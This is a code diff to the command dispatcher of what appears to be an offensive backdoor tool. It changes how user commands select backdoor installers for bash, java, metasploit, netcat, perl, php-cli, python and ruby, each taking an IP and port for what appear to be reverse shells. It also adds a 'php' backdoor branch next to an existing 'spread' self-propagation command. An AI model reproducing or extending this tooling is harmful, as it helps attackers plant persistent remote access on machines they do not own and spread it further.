@@ -79,14 +79,14 @@ class Commander(object):
                                 backdoor.bash(ip, port)
                             elif command.split()[1] == "java":
                                 backdoor.java(ip, port)
-                            elif command.split()[1] == "msf" or command.split()[1] == "metasploit":
+                            elif command.split()[1] == "metasploit" or command.split()[1] == "msf":
                                 backdoor.msf(ip, port)
                             elif command.split()[1] == "netcat" or command.split()[1] == "nc":
                                 backdoor.netcat(ip, port)
                             elif command.split()[1] == "perl" or command.split()[1] == "pl":
                                 backdoor.perl(ip, port)
-                            elif command.split()[1] == "php":
-                                backdoor.php(ip, port)
+                            elif command.split()[1] == "php-cli":
+                                backdoor.php_cli(ip, port)
                             elif command.split()[1] == "python" or command.split()[1] == "py":
                                 backdoor.python(ip, port)
                             elif command.split()[1] == "ruby" or command.split()[1] == "rb":
@@ -98,6 +98,8 @@ class Commander(object):
                         elif len(command.split()) == 2:
                             if command.split()[1] == "spread" or command.split()[1] == "self":
                                 backdoor.spread()
+                            elif command.split()[1] == "php":
+                                backdoor.php(info.host_ip.split(',')[0])
                             else:
                                 backdoor.list()
                         else:
